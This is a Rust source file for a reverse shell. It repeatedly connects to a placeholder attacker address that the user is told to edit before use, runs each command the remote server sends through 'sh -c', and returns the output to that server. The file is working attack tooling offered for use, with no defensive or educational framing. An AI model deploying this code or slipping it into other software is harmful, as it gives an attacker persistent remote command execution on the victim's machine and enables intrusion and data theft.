use std::process::{Command, Stdio};
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
use tokio::net::TcpStream as AsyncTcpStream;
use tokio::signal;
use colored::Colorize;
use tokio::sync::Mutex as AsyncMutex;

#[tokio::main]
async fn main() {
    let attackerinfo = "attacker_ip:port_here"; // --> Remember To Edit This Part Before Using It ;)
    let command_history = Arc::new(AsyncMutex::new(Vec::new()));

    loop {
        match AsyncTcpStream::connect(attackerinfo).await {
            Ok(stream) => {
                let command_history = Arc::clone(&command_history);
                cohandle(stream, command_history).await;
            }
            Err(e) => {
                eprintln!("{} {} {}","Failed to connect to server:".red(), e, "Retrying In 5 Seconds...".red());
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            }
        }
    }
}
async fn cohandle(mut stream: AsyncTcpStream, command_history: Arc<AsyncMutex<Vec<String>>>) {
    println!("{}","Connected To Server !".green());
    let (reader, mut writer) = stream.split();
    let mut reader = tokio::io::BufReader::new(reader);

    loop {
        let mut command = String::new();
        match reader.read_line(&mut command).await {
            Ok(0) => {
                println!("{}", "Server Closed The Connection :(".red());
                break;
            }
            Ok(_) => {
                let command = command;
                if command.is_empty() {
                    continue;
                }
                let mut history = command_history.lock().await;
                history.push(command.to_string());
                let output = exec_cmd(&*command);
                if let Err(e) = writer.write_all(output.as_bytes()).await {
                    eprintln!("{} {}","Failed to send response:".red(), e);
                    break;
                }
            }
            Err(e) => {
                eprintln!("{} {}","Error reading from server:".red(), e);
                break;
            }
        }
    }
    let _  = stream.shutdown();
}
fn exec_cmd(command: &str) -> String {
    let output = Command::new("sh").arg("-c").arg(command).stdout(Stdio::piped()).stderr(Stdio::piped()).output();
    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!(" '{}': {} {}", "Failed to execute command".red(), command, e),
    }
}

#[allow(dead_code)]
async fn handlesignal() {
    signal::ctrl_c().await.expect("Cooked");
    let exitmsg = "Received Ctrl+C, exiting...";
    println!("{}",exitmsg.red());
}
